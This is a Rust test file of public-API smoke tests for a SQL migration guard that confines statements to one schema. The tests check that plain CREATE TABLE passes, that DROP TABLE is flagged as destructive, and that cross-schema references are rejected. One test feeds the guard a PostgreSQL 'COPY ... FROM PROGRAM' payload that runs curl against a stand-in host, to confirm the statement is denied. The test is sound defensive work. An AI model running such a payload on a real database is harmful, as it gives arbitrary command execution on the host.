//! Focused public-API smoke tests for the extracted `zero-migrate-guard` crate.
//!
//! The exhaustive guard behaviour-lock suite (Platform/Trusted widening, vendor
//! lowering, the data-security IR gate) lives in the engine crate, because those
//! scenarios drive the guard THROUGH the engine's `render::lower` / `conn` apply
//! pipeline (which this leaf crate deliberately cannot depend on). These smoke
//! tests pin the guard's own public surface: the confined deny-list, the
//! cross-schema confinement, the string-literal extractor, and the analysis
//! re-exports.

use zero_migrate_guard::guard::{extract_string_literals, GuardConfig, GuardError, SqlGuard};

fn confined() -> SqlGuard {
    SqlGuard::new(GuardConfig::confined("app1"))
}

#[test]
fn confined_allows_a_plain_create_table() {
    let report = confined()
        .check("CREATE TABLE app1.widgets (id int)")
        .expect("a plain confined-schema CREATE TABLE must pass the guard");
    assert!(!report.destructive, "CREATE TABLE is not destructive");
}

#[test]
fn confined_denies_a_copy_program_rce() {
    // `COPY ... FROM PROGRAM` is arbitrary host command execution — the deny-list
    // must reject it under the confined (creator/AI) posture.
    let err = confined()
        .check("COPY app1.t FROM PROGRAM 'curl evil.example'")
        .expect_err("COPY FROM PROGRAM is RCE and must be denied");
    assert!(
        matches!(err, GuardError::Denied { .. }),
        "expected a hard Denied, got {err:?}"
    );
}

#[test]
fn confined_flags_a_drop_table_as_destructive() {
    let report = confined()
        .check("DROP TABLE app1.widgets")
        .expect("DROP TABLE is reversible-structure destructive, not denied outright");
    assert!(report.destructive, "DROP TABLE must be flagged destructive");
}

#[test]
fn confined_denies_a_cross_schema_reference() {
    let err = confined()
        .check("CREATE TABLE other_tenant.secrets (id int)")
        .expect_err("a non-confined schema reference is a cross-tenant violation");
    assert!(
        matches!(
            err,
            GuardError::CrossSchema { .. } | GuardError::Denied { .. }
        ),
        "expected a cross-schema/deny error, got {err:?}"
    );
}

#[test]
fn extract_string_literals_is_multibyte_faithful() {
    let lits = extract_string_literals("SELECT 'héllo', 'wörld'");
    assert_eq!(lits, vec!["héllo".to_string(), "wörld".to_string()]);
}

#[test]
fn analysis_reexports_are_reachable() {
    // The engine re-exports these through the guard crate; assert they resolve.
    let advisories = zero_migrate_guard::analyze::analyze("CREATE INDEX i ON app1.t (a)");
    let _ = advisories; // shape-only: analysis never denies.
    let classified = zero_migrate_guard::classify::classify("SELECT 1");
    assert!(
        classified.is_ok(),
        "a plain SELECT must classify without a parse error"
    );
}
